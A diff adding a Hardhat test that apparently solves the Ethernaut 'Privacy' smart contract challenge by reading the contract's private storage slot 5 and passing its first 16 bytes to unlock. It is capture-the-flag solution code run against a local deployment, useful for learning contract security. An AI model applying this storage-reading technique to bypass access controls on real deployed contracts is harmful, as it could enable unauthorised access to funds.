@@ -229,3 +229,28 @@ describe("Elevator", function () {
     expect(await deployedChallenge.top()).to.be.eq(true);
   });
 });
+
+describe("Privacy", function () {
+  it("Solution", async function () {
+    const challenge = await ethers.getContractFactory("Privacy");
+    const deployedChallenge = await challenge.deploy([
+      ethers.utils.formatBytes32String("1"),
+      ethers.utils.formatBytes32String("2"),
+      ethers.utils.formatBytes32String("3"),
+    ]);
+    await deployedChallenge.deployed();
+
+    // for (let i = 0; i <= 6; i++) {
+    //   console.log(
+    //     await ethers.provider.getStorageAt(deployedChallenge.address, i)
+    //   );
+    // }
+
+    const unlockTxn = await deployedChallenge.unlock(
+      (
+        await ethers.provider.getStorageAt(deployedChallenge.address, 5)
+      ).substring(0, 2 + 32)
+    );
+    await unlockTxn.wait();
+  });
+});
